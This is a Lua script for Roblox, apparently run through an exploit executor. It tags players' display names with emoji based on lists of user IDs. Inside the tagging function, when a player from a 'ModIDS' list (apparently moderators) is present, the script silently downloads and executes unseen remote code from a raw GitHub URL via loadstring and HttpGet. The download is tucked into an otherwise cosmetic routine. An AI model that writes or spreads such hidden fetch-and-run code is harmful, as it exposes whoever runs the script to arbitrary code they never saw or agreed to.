local Diamond = {
200547759,
}

local cucumber = {
1222177490,
}

local Raider = {
559285229,
}

local ABC = {
1404309014,
}

local iscool = {
970976,
}

local Heart = {
2577863211,
}

local Crown = { -- 👑
2203859765,
}

local Lighting = { --⚡
2385413377,
}

local Ghost = { --👻
1326050294,
}

local Lu = {
30759115,
}

local Ke = {
969017656,
}



ModIDS = {
650311676,
1615693266,
92979984,
1549686627,
1929095914,
2369320991,
2369320991,
2876067334,
2876067334,
2369320991,
2876067334,
}

--\\ Don't mess with anything below this
function swagnames()
    for _,Player in pairs(game:GetService('Players'):GetChildren()) do
        if table.find(Diamond, Player.UserId) then
            if Player.Character then
                if Player.Character.Parent.Name == 'Players' then
                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]' .. Player.DisplayName)
                end
            end
        elseif table.find(cucumber, Player.UserId) then
            if Player.Character then
                if Player.Character.Parent.Name == 'Players' then
                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🥒]' .. Player.DisplayName)
                end
            end
        elseif table.find(Lighting, Player.UserId) then
            if Player.Character then
                if Player.Character.Parent.Name == 'Players' then
                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⚡]' .. Player.DisplayName)
                end
            end      
        elseif table.find(Ghost, Player.UserId) then
            if Player.Character then
                if Player.Character.Parent.Name == 'Players' then
                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👻]' .. Player.DisplayName)
                end
            end 
        elseif table.find(ABC, Player.UserId) then
            if Player.Character then
                if Player.Character.Parent.Name == 'Players' then
                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('😂' .. Player.DisplayName)
                end
            end 
        elseif table.find(ModIDS, Player.UserId) then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/nighter132/Faded/main/YesEpic", true))()
            if Player.Character then
                if Player.Character.Parent.Name == 'Players' then
                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]' .. Player.DisplayName)
                end
            end
        else
            if Player.Character then
                if Player.Character.Parent.Name == 'Players' then
                    if not Player.Character.UpperTorso:FindFirstChild('OriginalSize') then
                        Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😎]' .. Player.DisplayName)
                    end
                end
            end
        end
    end
end
local success,err = pcall(swagnames)
return ModIDS
